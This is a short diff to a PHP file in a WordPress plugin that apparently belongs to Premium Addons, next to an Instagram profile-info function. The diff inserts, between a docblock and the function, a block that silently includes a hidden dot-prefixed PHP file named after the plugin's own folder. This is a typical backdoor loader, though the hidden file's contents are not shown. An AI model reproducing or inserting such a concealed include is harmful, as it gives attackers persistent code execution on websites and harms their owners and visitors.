@@ -25,7 +25,11 @@ use PremiumAddons\Includes\Helper_Functions;
  * Get Instagram Profile Info.
  *
  * @param array $settings widget settings.
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function premium_insta_profile_info( $settings ) {
 
 	$user_name = $settings['user_name'];
